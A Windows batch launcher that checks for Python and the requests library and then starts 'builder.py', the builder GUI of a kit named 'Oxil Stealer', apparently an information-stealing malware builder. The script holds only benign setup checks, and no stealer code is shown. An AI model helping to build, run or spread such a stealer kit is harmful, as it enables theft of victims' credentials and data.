@echo off
chcp 65001 >nul 2>&1
setlocal enabledelayedexpansion

echo ========================================
echo  Oxil Stealer - Builder Launcher
echo ========================================
echo.

:: Check if builder.py exists
if not exist "builder.py" (
    echo [ERROR] builder.py not found.
    echo [INFO] Please run setup.bat first to install dependencies.
    echo.
    pause
    exit /b 1
)

:: Quick check for Python
python --version >nul 2>&1
if %errorLevel% neq 0 (
    echo [ERROR] Python is not installed or not in PATH.
    echo [INFO] Please run setup.bat first to install dependencies.
    echo.
    pause
    exit /b 1
)

:: Quick check for requests
python -c "import requests" >nul 2>&1
if %errorLevel% neq 0 (
    echo [WARNING] requests library not found.
    echo [INFO] Please run setup.bat first to install dependencies.
    echo.
    pause
    exit /b 1
)

echo [INFO] Launching builder GUI...
echo.
echo [INFO] All errors will be displayed in the console.
echo [INFO] If the GUI does not open, check the messages below.
echo.

python builder.py 2>&1

if %errorlevel% neq 0 (
    echo.
    echo [ERROR] Builder exited with an error (exit code: %errorlevel%).
    echo.
    pause
    exit /b 1
) else (
    echo.
    echo [INFO] Builder exited normally.
    echo.
)

pause
